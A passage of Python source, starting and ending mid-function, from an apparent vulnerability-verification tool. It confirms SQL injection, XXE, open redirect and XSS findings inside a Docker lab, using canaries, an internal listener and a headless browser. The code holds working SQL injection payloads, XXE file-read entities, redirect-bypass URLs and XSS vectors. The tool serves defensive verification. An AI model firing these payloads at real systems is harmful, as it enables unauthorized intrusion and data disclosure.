                        res.evidence["weaponization"] = _sqli_wep
                except Exception:
                    pass
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
                          f"SLEEP y ninguna retraso la respuesta de forma consistente -- la SQLi "
                          f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
                          f"sean los reales, que el motor no soporte ninguno de los dialectos "
                          f"probados, o que de verdad no haya inyeccion)")
            # SQLi param rotation for generic verifier (like verify_wordpress_sqli)
            _gen_sqli_param = sqli_param or sqli_param_hint or ""
            if (not res.verified and parameters
                    and (_tried_params_set is None or len(_tried_params_set) < 3)):
                _gen_already_s = (_tried_params_set or frozenset()) | {_gen_sqli_param}
                _gen_names_s = (list(parameters.keys()) if isinstance(parameters, dict)
                                else list(parameters))
                _gen_cands_s = []
                for _h in _SQLI_HINTS:
                    for _pn in _gen_names_s:
                        if _h in _pn.lower() and _pn not in _gen_already_s and _pn not in _gen_cands_s:
                            _gen_cands_s.append(_pn)
                if _gen_cands_s:
                    _gen_next_s = _gen_cands_s[0]
                    _gen_budget_s = max(60.0, budget_s * 0.4)
                    step(f"SQLi generic param rotation: '{_gen_sqli_param}' sin señal; "
                         f"probando siguiente candidato '{_gen_next_s}'...")
                    _gen_rot_s = verify_generic_sqli_blind(
                        source_dir, endpoint, http_method, parameters,
                        sqli_param_hint=_gen_next_s, on_step=on_step,
                        budget_s=_gen_budget_s,
                        sqli_identifier_table_hint=sqli_identifier_table_hint,
                        custom_headers=custom_headers, setup_commands=setup_commands,
                        dockerfile_body=dockerfile_body, extra_files=extra_files,
                        confirm_string=confirm_string,
                        _tried_params_set=_gen_already_s,
                    )
                    if _gen_rot_s.verified:
                        return _gen_rot_s
            # Exhaustive param sweep (boolean-only, fast): when no sqli_param_hint was given
            # AND the hint-based rotation didn't fire, try every remaining param with just the
            # boolean-blind check (no full time-based scan). ~8 requests per param so 5 extra
            # params costs ~40 extra requests — worth it to catch non-hint names like `sorting`.
            # Skip this sweep when sqli_param_hint was explicitly provided (the caller knows
            # which param to try) or when _tried_params_set already has 3+ entries.
            _sweep_tried = (_tried_params_set or frozenset()) | {sqli_param}
            if (not res.verified and not sqli_param_hint
                    and parameters and len(_sweep_tried) < 4):
                _sweep_names = (list(parameters.keys()) if isinstance(parameters, dict)
                                else list(parameters))
                # Skip pagination/filter params that virtually never carry SQL taint
                _sweep_skip = {"page", "limit", "offset", "per_page", "format", "callback",
                               "lang", "locale", "timezone", "debug", "pretty"}
                _sweep_cands = [
                    p for p in _sweep_names
                    if p not in _sweep_tried and p.lower() not in _sweep_skip
                ][:5]
                for _sweep_p in _sweep_cands:
                    if res.verified:
                        break
                    step(f"SQLi param sweep (boolean-only): probando '{_sweep_p}' "
                         f"(sin hint, {len(_sweep_tried)} ya intentados)...")
                    _sweep_base = dict(base_params)
                    _sweep_orig = str(_sweep_base.get(_sweep_p) or "1")
                    _sweep_threshold = max(8, int((_ctrl_len if isinstance(_ctrl_len, int) else 20) * 0.05))

                    def _sweep_send(val: str, _sb=_sweep_base, _sp=_sweep_p) -> Optional[int]:
                        _p2 = dict(_sb); _p2[_sp] = val
                        try:
                            _r2 = _http_request(m, base_url + endpoint_path, timeout=12,
                                                data=_p2 if m != "GET" else None,
                                                params=_p2 if m == "GET" else None,
                                                headers=custom_headers or None)
                            return len(getattr(_r2, "text", "") or "")
                        except Exception:
                            return None

                    _sweep_ctrl = _sweep_send(_sweep_orig)
                    if _sweep_ctrl is None:
                        _sweep_tried = _sweep_tried | {_sweep_p}
                        continue
                    _sweep_th2 = max(8, int(_sweep_ctrl * 0.05))
                    _sweep_hit = False
                    for _sp_true, _sp_false in [
                        (f"{_sweep_orig}' AND '1'='1", f"{_sweep_orig}' AND '1'='2"),
                        (f"{_sweep_orig} AND 1=1-- -", f"{_sweep_orig} AND 1=2-- -"),
                        (f"{_sweep_orig}' OR '1'='1",  f"{_sweep_orig}' OR '1'='2"),
                        (f"{_sweep_orig} OR 1=1-- -",  f"{_sweep_orig} OR 1=2-- -"),
                    ]:
                        _t = _sweep_send(_sp_true)
                        _f = _sweep_send(_sp_false)
                        if (_t is not None and _f is not None
                                and abs(_t - _f) >= _sweep_th2
                                and abs(_t - _sweep_ctrl) < max(100, _sweep_ctrl // 2)):
                            # Found a differential — escalate to full verify with this param
                            step(f"SQLi param sweep: diferencial en '{_sweep_p}' "
                                 f"({abs(_t - _f)}B) — escalando a verificacion completa...")
                            _sweep_full = verify_generic_sqli_blind(
                                source_dir, endpoint, http_method, parameters,
                                sqli_param_hint=_sweep_p, on_step=on_step,
                                budget_s=max(60.0, budget_s * 0.3),
                                sqli_identifier_table_hint=sqli_identifier_table_hint,
                                custom_headers=custom_headers, setup_commands=setup_commands,
                                dockerfile_body=dockerfile_body, extra_files=extra_files,
                                confirm_string=confirm_string,
                                _tried_params_set=_sweep_tried | {_sweep_p},
                            )
                            if _sweep_full.verified:
                                return _sweep_full
                            _sweep_hit = True
                            break
                    _sweep_tried = _sweep_tried | {_sweep_p}
                    if _sweep_hit:
                        break
            if not res.verified and res.confidence == "none":
                res.confidence = "inconclusive"
        # --- Header injection fallback (generic) ---
        if not res.verified:
            _gen_hdr_cands = []
            if sqli_header_hint:
                _gen_hdr_cands = [sqli_header_hint]
            else:
                _hyp_txt = str(parameters) + str(endpoint)
                for _hdr in _HEADER_INJECTION_HINTS:
                    if _hdr.lower().replace("-", "_") in _hyp_txt.lower():
                        _gen_hdr_cands.append(_hdr)
            for _inject_hdr in _gen_hdr_cands[:3]:
                step(f"header injection fallback: probando error-based SQLi en header '{_inject_hdr}'...")
                _hdr_probes = [
                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
                    "1 AND 1=CONVERT(int,@@version)-- -",
                    "1' OR '1'='1",
                ]
                for _hp in _hdr_probes:
                    try:
                        _all_hdrs = dict(custom_headers or {})
                        _all_hdrs[_inject_hdr] = _hp
                        _hr = _http_request(m, base_url + endpoint_path, timeout=15,
                                            params=base_params if m == "GET" else None,
                                            data=base_params if m != "GET" else None,
                                            headers=_all_hdrs)
                        _body = _hr.text if hasattr(_hr, "text") else str(_hr)
                        if any(sig in _body for sig in ("extractvalue", "XPATH syntax error",
                                                         "SQL syntax", "ODBC SQL",
                                                         "mysql_num_rows")):
                            res.verified = True
                            res.ok = True
                            res.confidence = "confirmed"
                            res.evidence.update({
                                "tecnica": "error-based-header-injection",
                                "header": _inject_hdr,
                                "payload_ganador": _hp,
                                "respuesta_cuerpo_recorte": _body[:500],
                            })
                            res.detail = (f"SQLi via header '{_inject_hdr}' = {_hp!r} produjo error SQL")
                            step(f"VERIFICADO via header: '{_inject_hdr}'")
                            break
                    except Exception:
                        pass
                if res.verified:
                    break
        # PostgreSQL fallback for generic SQLi: try pg_sleep when all SLEEP-based techniques fail
        if not res.verified and sqli_param:
            _all_responses_text = " ".join(str(t.get("body", "") or "") for t in tried[:5])
            _pg_sigs = ("postgresql", "pg_catalog", "psql", "psycopg", "pgsql",
                        "org.postgresql", "asyncpg", "sqlalchemy")
            _is_pg = any(s.lower() in _all_responses_text.lower() for s in _pg_sigs)
            if _is_pg:
                step("generic SQLi: PostgreSQL signals detected — trying pg_sleep payloads")
                _pg_pairs = [
                    ("'; SELECT pg_sleep(5)-- -", "'; SELECT pg_sleep(0)-- -"),
                    ("' OR (SELECT pg_sleep(5))::text='1", "' OR (SELECT pg_sleep(0))::text='1"),
                    ("1; SELECT pg_sleep(5)-- -", "1; SELECT pg_sleep(0)-- -"),
                ]
                for _pgs, _pgf in _pg_pairs:
                    try:
                        _pgbp = dict(base_params); _pgbp[sqli_param] = _pgf
                        _tf0 = time.time()
                        _http_request(m, base_url + endpoint_path, timeout=12,
                                      params=_pgbp if m == "GET" else None,
                                      data=_pgbp if m != "GET" else None,
                                      headers=custom_headers or None)
                        _pgf_t = time.time() - _tf0
                        _pgbs = dict(base_params); _pgbs[sqli_param] = _pgs
                        _ts0 = time.time()
                        _http_request(m, base_url + endpoint_path, timeout=15,
                                      params=_pgbs if m == "GET" else None,
                                      data=_pgbs if m != "GET" else None,
                                      headers=custom_headers or None)
                        _pgs_t = time.time() - _ts0
                        if (_pgs_t - _pgf_t) >= 3.5:
                            res.verified = True
                            res.ok = True
                            res.confidence = "probable"
                            res.evidence["tecnica"] = "postgres-time-based-generic"
                            res.evidence["pg_slow_s"] = round(_pgs_t, 2)
                            res.evidence["pg_fast_s"] = round(_pgf_t, 2)
                            res.detail = f"PostgreSQL time-based blind SQLi (generic): pg_sleep delay {_pgs_t:.1f}s vs {_pgf_t:.1f}s"
                            step(f"GENERIC SQLi POSTGRES confirmado: delay {_pgs_t:.1f}s")
                            break
                    except Exception:
                        pass
        if not res.verified:
            _capture_container_logs_on_failure(container, res, step)
            # Second-order SQLi fallback: store payload in a writable endpoint, then trigger read
            # from a read endpoint that renders stored data — canary appears if stored SQL executed.
            _so_canary = f"BINO_{_token()[:8]}"
            _SO_STORE_PATHS = [
                ("POST", "/api/users/me", {"name": "{p}"}, "/api/users/me"),
                ("POST", "/profile", {"display_name": "{p}", "bio": "{p}"}, "/profile"),
                ("POST", "/account", {"username": "{p}"}, "/account"),
                ("PUT", "/api/profile", {"name": "{p}"}, "/api/profile"),
                ("POST", "/api/v1/users/me", {"name": "{p}"}, "/api/v1/users/me"),
                ("PUT", "/api/v1/profile", {"name": "{p}"}, "/api/v1/profile"),
            ]
            _so_payload = f"' UNION SELECT NULL,'{_so_canary}',NULL-- -"
            _so_tried = False
            for _so_meth, _so_store_path, _so_tmpl, _so_trigger_path in _SO_STORE_PATHS:
                _so_params = {k: v.replace("{p}", _so_payload) for k, v in _so_tmpl.items()}
                try:
                    _r_store = _http_request(
                        _so_meth, base_url + _so_store_path,
                        json=_so_params, timeout=10,
                        headers={"Content-Type": "application/json"})
                    if _r_store is None or _r_store.status_code not in (200, 201, 204):
                        continue
                    _r_trigger = _http_request("GET", base_url + _so_trigger_path, timeout=10)
                    if _r_trigger and _so_canary in (_r_trigger.text or ""):
                        res.verified = True
                        res.ok = True
                        res.confidence = "confirmed"
                        res.evidence["second_order_sqli"] = {
                            "store_path": _so_store_path,
                            "trigger_path": _so_trigger_path,
                            "canary_found": True}
                        res.detail = (f"Second-order SQLi confirmed: payload stored via "
                                      f"'{_so_store_path}', canary reflected via '{_so_trigger_path}'")
                        step("[second-order SQLi] canary found in trigger response — confirmed!")
                        _so_tried = True
                        break
                    _so_tried = True
                except Exception:
                    pass
            if _so_tried and not res.verified:
                step("[second-order SQLi] no canary reflection found in trigger endpoints")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_xxe(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xml_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xxe: planta un canario dentro del contenedor real
    del objetivo y prueba las mismas variantes de entidad externa (DOCTYPE normal, parametro-
    entidad, envuelta en SOAP) como parametro de formulario y como cuerpo crudo
    (application/xml, text/xml). Si ninguna devuelve el secreto en banda, cae al mismo fallback
    OOB/ciego via el listener interno que SSRF -- el mecanismo (parser XML resolviendo
    file://, o una URL externa) no depende del stack que procese el XML."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"contenedor del objetivo)...")
        if not lab.write_canary(container, canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_general = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                       f'"file://{canary_path}">]><foo>&xxe;</foo>')
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                           f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xxe_xinclude = (f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
                        f'<xi:include parse="text" href="file://{canary_path}"/></foo>')
        xxe_svg = (f'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg ['
                   f'<!ENTITY xxe SYSTEM "file://{canary_path}">]>'
                   f'<text>&xxe;</text></svg>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_general),
                        ("parametro-entidad", xxe_param_entity),
                        ("XInclude", xxe_xinclude),
                        ("SVG embed", xxe_svg),
                        ("envuelta en SOAP", xxe_soap)]

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "xml_param": xml_param or "(cuerpo crudo)",
                             "canary_path": canary_path, "canary_secret": secret})

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            try:
                resp = _http_request(m, base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            present = secret in (resp.text or "")
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta ({label}).")

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                try:
                    if xml_param:
                        payload[xml_param] = oob_xml
                        _http_request(m, base_url + endpoint, timeout=20,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
                    else:
                        _http_request(m, base_url + endpoint, data=oob_xml.encode(),
                                        headers={"Content-Type": "application/xml"}, timeout=20)
                except Exception:
                    pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando a un listener interno (inalcanzable "
                              "desde fuera del laboratorio), y la conexion llego con el token "
                              "exacto -- prueba de que el parser resuelve entidades externas "
                              "arbitrarias, aunque no se extrajo el contenido del fichero")
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path} -- el "
                              f"parser XML resolvio una entidad externa apuntando al sistema de "
                              f"ficheros real")
            _xxe_body = res.evidence.get("respuesta_cuerpo_recorte", "")
            _xxe_hl = res.evidence.get("canary_secret", "") or "SYSTEM"
            _xxe_url = base_url + (endpoint or "/")
            _add_exploit_evidence(
                res=res, method=m, url=_xxe_url, resp_or_body=_xxe_body,
                highlight=_xxe_hl,
                caption_es=(f"XXE CONFIRMADA ({res.evidence.get('modo_ganador','')}): "
                            f"entidad externa resuelta, secreto plantado en respuesta."),
                caption_en=(f"XXE CONFIRMED ({res.evidence.get('modo_ganador','')}): "
                            f"external entity resolved, planted secret in response."),
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
                          f"nada -- el XXE no se confirmo (puede que el parser tenga las "
                          f"entidades externas desactivadas, o el endpoint/parametro no son los "
                          f"reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_open_redirect(
    source_dir: str, endpoint: str, http_method: str, parameters,
    redirect_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_open_redirect: manda la misma bateria de variantes de
    URL externa/bypass (directa, protocol-relative, backslash, userinfo, espacios/tabs,
    subdominio del host confiable) con allow_redirects=False, y solo marca verificado si la
    respuesta es un 3xx con Location conteniendo el dominio externo exacto -- el mecanismo de
    prueba (inspeccionar la cabecera Location real) no depende del stack."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' o pasalo a mano "
                               "(redirect_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files,
                                  setup_commands=setup_commands)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        targets = [
            f"https://{evil_host}/pwned",
            f"//{evil_host}/pwned",
            f"https:/\\{evil_host}/pwned",
            f"https:\\\\{evil_host}\\pwned",
            f"https://trusted.example.com@{evil_host}/pwned",
            f"https://{evil_host}\\@trusted.example.com/pwned",
            f" https://{evil_host}/pwned",
            f"\thttps://{evil_host}/pwned",
            f"https://{evil_host}#@trusted.example.com/",
            f"https://trusted.example.com.{evil_host}/pwned",
            # triple/cuadruple slash y slash inicial delante de URL absoluta -- casuistica real
            # de Open Redirect/Intruder/Open-Redirect-payloads.txt en PayloadsAllTheThings.
            f"///{evil_host}/pwned", f"////{evil_host}/pwned",
            f"/https://{evil_host}/pwned",
        ]
        # ademas de las anteriores, las ~155 variantes generalizables de las 3 wordlists de Open
        # Redirect en PayloadsAllTheThings (ver payload_kb.load_open_redirect_templates).
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[redirect_param] = target
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None,
                                        allow_redirects=False,
                                        headers=custom_headers or None)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
                             "metodo": m, "intentos": tried})

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
                          f"de verdad a un dominio externo controlado por el atacante")
            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
                 f"externo enviado.")
            _redir_body = (f"HTTP/1.1 {confirmed_entry['status']} Found\n"
                           f"Location: {confirmed_entry['location']}\n\n"
                           f"Redirect to attacker-controlled domain confirmed")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + (endpoint or "/"),
                resp_or_body=_redir_body,
                highlight=confirmed_entry["location"],
                caption_es=(f"OPEN REDIRECT CONFIRMADO: {redirect_param}={confirmed_entry['target']!r} "
                            f"→ {confirmed_entry['status']} Location: {confirmed_entry['location']}"),
                caption_en=(f"OPEN REDIRECT CONFIRMED: {redirect_param}={confirmed_entry['target']!r} "
                            f"→ {confirmed_entry['status']} Location: {confirmed_entry['location']}"),
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
                          f"para {redirect_param} y ninguna produjo un redirect con "
                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
            if tried:
                first = tried[0]
                res.evidence["respuesta_cuerpo_recorte"] = (
                    f"status={first.get('status')} location={first.get('location')!r}")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_xss(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xss_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xss: carga la respuesta en un Chromium headless REAL
    (ver _xss_render) y prueba la misma bateria de variantes elegidas a mano (rotura de HTML/
    atributo/contexto JS-string/URI) MAS las ~500 variantes generalizables de
    xss_alert_identifiable.txt en PayloadsAllTheThings -- solo se marca verificado si
    document.title cambia EXACTO al marcador, prueba de ejecucion real de JS, no de que el
    payload simplemente aparezca en el HTML crudo de la respuesta."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' o pasalo a mano (xss_param_hint)")
        return res

    lab = None
    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION, no basta ver el payload "
                     "reflejado en el HTML crudo")
        res.limitations.append("verificacion dinamica NO intentada: falta Playwright "
                               "(pip install playwright && playwright install chromium)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files,
                                  setup_commands=setup_commands)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"
        attempts = [
            f"<script>{js}</script>",
            f"<img src=x onerror=\"{js}\">",
            f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">",
            f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"\"><script>{js}</script>",
            f"'><script>{js}</script>",
            f"\" onmouseover=\"{js}\" x=\"",
            f"' onmouseover='{js}' x='",
            f"';{js};//", f'";{js};//',
            f"</script><script>{js}</script>",
            f"javascript:{js}",
            f"<ScRiPt>{js}</sCrIpT>",
            f"<svg/onload=\"{js}\">",
        ]
        attempts += load_xss_payloads(js)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        found = False
        tried = []

        # Reflected-XSS parameter scan: probe all parameters for raw reflection before
        # launching the heavyweight Playwright session. If a parameter reflects the probe
        # token verbatim in the HTML body it becomes the confirmed xss_param (overrides hint).
        # This is a fast HTTP-only pre-check — confirmation still requires JS execution below.
        _reflect_token = f"binoracle-reflect-{token}"
        _all_param_keys = list((parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")).keys())
        _reflected_params: list[str] = []
        for _rp in _all_param_keys:
            try:
                _rparams = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(_all_param_keys, "")
                _rparams[_rp] = _reflect_token
                _rr = _http_request(m, base_url + endpoint,
                                    data=_rparams if m != "GET" else None,
                                    params=_rparams if m == "GET" else None, timeout=10)
                if _reflect_token in (getattr(_rr, "text", "") or ""):
                    _reflected_params.append(_rp)
                    step(f"[reflect-scan] param '{_rp}' refleja input en la respuesta")
            except Exception:
                pass
        if _reflected_params:
            res.evidence["reflected_params"] = _reflected_params
            if xss_param not in _reflected_params:
                xss_param = _reflected_params[0]
                step(f"[reflect-scan] usando param reflejado '{xss_param}' (el hint no reflejaba input)")
        elif _all_param_keys:
            step(f"[reflect-scan] ninguno de {len(_all_param_keys)} params reflejo el token (puede ser JSON o contexto DOM)")

        # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
        # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el
        # arranque del propio navegador, no la navegacion entre paginas.
        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
        with _XssBrowserSession() as xb:
            for payload_value in attempts:
                params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                params[xss_param] = payload_value
                title, _ = xb.render(base_url, endpoint, m, params, [])
                tried.append({"payload": payload_value, "title_resultante": title})
                if title == marker:
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
                         f"cambio exactamente a '{marker}'.")
                    from urllib.parse import urlencode
                    _xss_url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    _, _xss_png = xb.render(base_url, endpoint, m, params, [], capture=True)
                    if _xss_png:
                        res.evidence.setdefault("screenshots", []).append({
                            "png_b64": _xss_png, "url": _xss_url,
                            "caption_es": (f"XSS confirmado: el navegador Chromium headless "
                                           f"ejecuto el script inyectado en '{xss_param}' -- "
                                           f"document.title cambio a '{marker}' (prueba de "
                                           f"ejecucion JS real, no solo reflexion de texto)."),
                            "caption_en": (f"XSS confirmed: headless Chromium executed the "
                                           f"injected script in '{xss_param}' -- document.title "
                                           f"changed to '{marker}' (proof of real JS execution, "
                                           f"not just text reflection)."),
                        })
                    _xss_body = (f"XSS EJECUTADO — document.title = '{marker}'\n\n"
                                 f"Parametro: {xss_param}\n"
                                 f"Payload: {payload_value}\n"
                                 f"URL completa:\n{_xss_url}")
                    _add_exploit_evidence(
                        res=res, method=m, url=_xss_url,
                        resp_or_body=_xss_body, highlight=marker,
                        caption_es=(f"XSS CONFIRMADO: script ejecutado en '{xss_param}' — "
                                    f"document.title cambio a '{marker}' en Chromium headless."),
                        caption_en=(f"XSS CONFIRMED: script executed in '{xss_param}' — "
                                    f"document.title changed to '{marker}' in headless Chromium."),
                    )
                    break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "intentos_count": len(tried)})
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
                          f"{xss_param} -- document.title cambio exactamente a '{marker}', algo "
                          f"que solo el motor JS del navegador pudo hacer, no una coincidencia de "
                          f"texto reflejado")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                          f"ninguna el navegador ejecuto el script -- el XSS no se confirmo "
                          f"(puede que el contexto de reflexion sea distinto, que haya "
                          f"sanitizacion real, o que el efecto solo se vea en otra pagina)")
            try:
                sample_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
